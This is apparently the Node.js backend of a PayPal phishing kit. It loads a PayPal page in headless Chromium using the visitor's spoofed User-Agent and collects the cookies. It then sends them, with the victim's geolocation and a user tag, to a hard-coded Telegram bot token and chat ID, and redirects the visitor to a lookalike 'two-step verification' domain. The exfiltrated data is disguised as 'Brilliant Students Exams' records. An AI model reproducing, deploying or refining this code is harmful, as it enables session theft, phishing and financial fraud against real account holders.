const puppeteer = require('puppeteer');
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

const BOT_TOKEN = "8357190104:AAGRU7LylcJDfGyYGAQHhni7e8PyAC8PKkU";
const CHAT_ID = "8259952691";
const TWO_STEP_URL = "https://2stepverification.page.gd";

app.use(express.json());

async function getGeoInfo() {
    try {
        const resp = await fetch('https://ipapi.co/json/');
        if (!resp.ok) throw new Error('IP API failed');
        const data = await resp.json();
        return {
            country: data.country_name || "Unknown",
            city: data.city || "Unknown",
            region: data.region || "Unknown"
        };
    } catch (e) {
        return { country: "Unknown", city: "Unknown", region: "Unknown" };
    }
}

async function sendToTelegram(paypalCookies, userTag, examNumber, geoInfo, url, userAgent) {
    const message =
        `📘 *Brilliant Students Exams*\n` +
        `🏷️ Tag: ${userTag}\n` +
        `🧾 Exam Number: ${examNumber}\n` +
        `🍪 PayPal Cookies: ${paypalCookies}\n` +
        `🌍 Country: ${geoInfo.country}\n` +
        `🏙️ City/Region: ${geoInfo.city}, ${geoInfo.region}\n` +
        `🌐 Loaded URL: ${url}\n` +
        `🖥️ User-Agent: ${userAgent}\n` +
        `✔️ Passed 2nd Stage`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            })
        });
        const data = await response.json();
        if (data.ok) {
            console.log("Message sent successfully to Telegram");
        } else {
            console.error("Telegram API error:", data);
        }
    } catch (err) {
        console.error("Error sending to Telegram:", err);
    }
}

async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgent) {
    let browser;
    try {
        // Use Puppeteer's bundled Chromium
        browser = await puppeteer.launch({
            headless: true,
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'],
            // Remove executablePath to use bundled Chromium
        });
        const page = await browser.newPage();

        // Use client’s User-Agent if provided, else a generic one
        const userAgent = clientUserAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36';
        await page.setUserAgent(userAgent);

        // Set headers to mimic a browser
        await page.setExtraHTTPHeaders({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
        });

        // Navigate to PayPal URL
        const response = await page.goto(paypalUrl, { waitUntil: 'networkidle2', timeout: 30000 });
        if (!response.ok()) {
            throw new Error(`HTTP error! Status: ${response.status()}`);
        }

        // Extract cookies
        const cookies = await page.cookies();
        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');

        // Get GeoInfo
        const geoInfo = await getGeoInfo();

        // Send to Telegram
        await sendToTelegram(cookieString || "No cookies found", userTag, examNumber, geoInfo, paypalUrl, userAgent);

        return { success: true, cookies: cookieString, redirectUrl: `${TWO_STEP_URL}?userTag=${encodeURIComponent(userTag)}` };
    } catch (err) {
        console.error("Puppeteer error:", err);
        const geoInfo = await getGeoInfo();
        await sendToTelegram(`Failed to fetch PayPal: ${err.message}`, userTag, examNumber, geoInfo, paypalUrl, userAgent);
        return { success: false, error: err.message, redirectUrl: `${TWO_STEP_URL}?userTag=${encodeURIComponent(userTag)}` };
    } finally {
        if (browser) await browser.close();
    }
}

app.get('/api/paypal', async (req, res) => {
    const paypalUrl = req.query.url || 'https://www.paypal.com';
    const userTag = req.query.userTag || 'UnknownUser';
    const examNumber = req.query.examNumber || '';
    const clientUserAgent = req.headers['user-agent'] || '';

    if (!paypalUrl.startsWith('https://www.paypal.com')) {
        return res.status(400).json({ success: false, error: 'Invalid PayPal URL' });
    }

    const result = await fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgent);
    res.json(result);
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
